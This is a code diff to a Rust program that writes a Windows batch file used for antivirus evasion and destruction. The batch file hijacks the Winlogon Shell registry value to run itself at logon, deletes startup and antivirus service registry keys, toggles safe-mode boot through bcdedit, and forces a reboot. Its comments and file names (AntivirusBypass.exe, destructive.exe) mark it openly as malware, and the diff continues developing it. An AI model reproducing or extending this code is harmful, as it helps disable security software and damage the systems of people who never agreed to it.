@@ -9,6 +9,7 @@ use std::env;
 use std::ffi::OsString;
 use std::time::Duration;
 use std::thread::sleep;
+use std::fs::OpenOptions;
 
 fn is_in_safe_mode() -> bool {
     let batch_content = r#"@echo off
@@ -204,7 +205,7 @@ fn modify_registry_avast() -> io::Result<()> {
 }
 
 fn create_batch_file() -> io::Result<()> {
-    // Create a batch file to clean up Safe Mode and schedule desturctive.exe
+    // Create a batch file to clean up Safe Mode and schedule destructive.exe
     let batch_content = r#"
 @echo off
 :: Check if we are in Safe Mode by examining the current boot entry
@@ -213,9 +214,12 @@ if %errorlevel% == 0 (
     echo Safe Mode is enabled, proceeding with actions...
 ) else (
     echo Safe Mode is not enabled
-    del "c:\program files\utkudrk2\AntivirusBypass.exe"
-    del "c:\program files\utkudrk2\utkdurk2.bat"
-    "c:\program files\utkudrk2\destructive.exe"
+    if exist "C:\Program Files\utkudrk2\test.txt" (
+        del "C:\Program Files\utkudrk2\AntivirusBypass.exe"
+    )
+    
+    del "C:\Program Files\utkudrk2\utkdurk2.bat"
+    del "C:\Program Files\utkudrk2\destructive.exe"
     exit
 )
 
@@ -224,12 +228,9 @@ if %errorlevel% == 0 (
 :: Modify Shell registry to run batch file
 echo Modifying registry to set Shell value...
 reg delete "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Shell /f
-reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Shell /t REG_SZ /d "explorer.exe, c:\program files\utkudrk2\utkudrk2.bat" /f
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Shell /t REG_SZ /d "explorer.exe, C:\Program Files\utkudrk2\utkudrk2.bat" /f
 
 :: Perform cleanup tasks
-echo Removing Safe Mode setting...
-bcdedit /deletevalue {current} safeboot
-
 :: Delete registry keys related to antivirus services
 echo Deleting registry keys...
 reg delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /f
@@ -244,17 +245,27 @@ reg delete "HKLM\SYSTEM\CurrentControlSet\Services\VSSERV" /f
 reg delete "HKLM\SYSTEM\ControlSet001\Services\VSSERV" /f
 
 :: Confirm completion
-echo Cleanup tasks completed. Safe Mode should now be removed, desturctive.exe is scheduled to run, and Shell key is modified.
+echo Cleanup tasks completed. Safe Mode should now be removed, destructive.exe is scheduled to run, and Shell key is modified.
 
 :: Reboot the system after completion
-shutdown /r /f /t 5
+echo Removing Safe Mode setting...
+bcdedit /deletevalue {current} safeboot
 
-:: Exit
+shutdown /r /f /t 5
 exit
 "#;
 
-    let path = Path::new("c:\\Program Files\\utkudrk2\\utkudrk2.bat");
-    let mut file = File::create(path)?;
+    // Define the path to the batch file.
+    let path = Path::new("C:\\Program Files\\utkudrk2\\utkudrk2.bat");
+
+    // Create the file (ensure the directory exists and is writable).
+    let mut file = OpenOptions::new()
+        .create(true)
+        .write(true)
+        .truncate(true)
+        .open(path)?;
+
+    // Write the batch content to the file.
     file.write_all(batch_content.as_bytes())?;
 
     Ok(())
